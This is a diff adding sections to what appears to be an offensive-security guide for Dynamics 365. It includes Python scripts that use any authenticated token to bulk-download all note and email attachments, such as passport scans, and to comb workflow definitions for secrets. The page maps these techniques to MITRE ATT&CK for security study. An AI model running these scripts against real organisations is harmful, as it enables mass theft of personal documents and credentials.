@@ -409,6 +409,94 @@ for row in r.json()["value"]:
     cleartext, with no field security profile in the way — exactly the kind of data you never want to
     explain to a regulator, one OData query from any authenticated token.</p>
 
+    <h2 class="ui header"><i class="sticky note outline icon"></i> Annotations (Note Attachments)</h2>
+    <p>Columns are only half the data. Users attach <em>files</em> to records as Notes, and every one
+    of those files lives in the <code>annotation</code> table with the bytes inline as base64 in
+    <code>documentbody</code>. Filtering on <code>isdocument eq true</code> lists every attachment in
+    the org — contracts, ID scans, spreadsheets — with the record type it hangs off:</p>
+    <pre><code class="language-http">GET https://org.crm.dynamics.com/api/data/v9.2/annotations
+      ?$select=filename,mimetype,subject,objecttypecode
+      &amp;$filter=isdocument eq true
+Authorization: Bearer &lt;token&gt;
+
+{
+  "value": [
+    { "filename": "passport_scan.pdf",    "mimetype": "application/pdf", "objecttypecode": "contact" },
+    { "filename": "signed_contract.docx", "mimetype": "application/...", "objecttypecode": "cr123_contract" },
+    ... more ...
+  ]
+}</code></pre>
+    <p>Add <code>documentbody</code> to the select on a single row and you get the file itself. In
+    Python that's list-then-download — every attached document walked out over the Web API:</p>
+    <div class="ui segment">
+      <div class="ui blue ribbon label"><i class="python icon"></i> Python</div>
+      <pre><code class="language-python">import base64, pathlib
+
+notes = session.get(f"{ORG}/api/data/v9.2/annotations", params={
+    "$select": "annotationid,filename,mimetype",
+    "$filter": "isdocument eq true",
+    "$top":    5000,
+}).json()["value"]
+
+for n in notes:
+    blob = session.get(f"{ORG}/api/data/v9.2/annotations({n['annotationid']})",
+                       params={"$select": "documentbody"}).json()["documentbody"]
+    pathlib.Path(n["filename"]).write_bytes(base64.b64decode(blob))
+    print("saved", n["filename"], n["mimetype"])</code></pre>
+    </div>
+
+    <h2 class="ui header"><i class="paperclip icon"></i> Activity Attachments</h2>
+    <p>Email sent and received through Dynamics keeps its attachments too — in the
+    <code>activitymimeattachment</code> table, the base64 <code>body</code> of every file that rode an
+    email or appointment. Same pull, different table, and often the richer one because it captures
+    what people <em>send</em>, not just what they store:</p>
+    <pre><code class="language-http">GET https://org.crm.dynamics.com/api/data/v9.2/activitymimeattachments
+      ?$select=filename,mimetype,subject
+Authorization: Bearer &lt;token&gt;</code></pre>
+    <div class="ui segment">
+      <div class="ui blue ribbon label"><i class="python icon"></i> Python</div>
+      <pre><code class="language-python">import base64, pathlib
+
+atts = session.get(f"{ORG}/api/data/v9.2/activitymimeattachments", params={
+    "$select": "activitymimeattachmentid,filename,mimetype",
+    "$top":    5000,
+}).json()["value"]
+
+for a in atts:
+    body = session.get(f"{ORG}/api/data/v9.2/activitymimeattachments({a['activitymimeattachmentid']})",
+                       params={"$select": "body"}).json()["body"]
+    pathlib.Path(a["filename"]).write_bytes(base64.b64decode(body))
+    print("saved", a["filename"], a["mimetype"])</code></pre>
+    </div>
+
+    <h2 class="ui header"><i class="cogs icon"></i> Workflows &amp; Processes</h2>
+    <p>The <code>workflow</code> table stores every automation in the org — classic workflows,
+    business process flows, actions, and modern cloud flows (Power Automate) — distinguished by
+    <code>category</code>. Their definitions (<code>clientdata</code> JSON for modern flows,
+    <code>xaml</code> for classic) map the plumbing: which systems the org integrates with, what
+    triggers on which records, and — more often than anyone would like — hard-coded URLs, connection
+    references, and the occasional secret:</p>
+    <pre><code class="language-http">GET https://org.crm.dynamics.com/api/data/v9.2/workflows
+      ?$select=name,category,statecode,createdon
+      &amp;$filter=statecode eq 1
+Authorization: Bearer &lt;token&gt;</code></pre>
+    <div class="ui segment">
+      <div class="ui blue ribbon label"><i class="python icon"></i> Python</div>
+      <pre><code class="language-python">CAT = {0: "Workflow", 1: "Dialog", 2: "Business Rule",
+       3: "Action", 4: "Business Process Flow", 5: "Modern Flow"}
+
+flows = session.get(f"{ORG}/api/data/v9.2/workflows", params={
+    "$select": "name,category,statecode,clientdata,xaml",
+}).json()["value"]
+
+for f in flows:
+    print(CAT.get(f["category"], f["category"]), "-", f["name"])
+    # clientdata / xaml frequently leak endpoints, connection refs, and secrets
+    defn = f.get("clientdata") or f.get("xaml") or ""
+    if "https://" in defn:
+        print("   contains hard-coded URL(s)")</code></pre>
+    </div>
+
     <h2 class="ui header"><i class="crosshairs icon"></i> MITRE ATT&amp;CK mapping</h2>
     <table class="ui blue celled striped table">
       <thead><tr><th>Tactic</th><th>Technique</th></tr></thead>
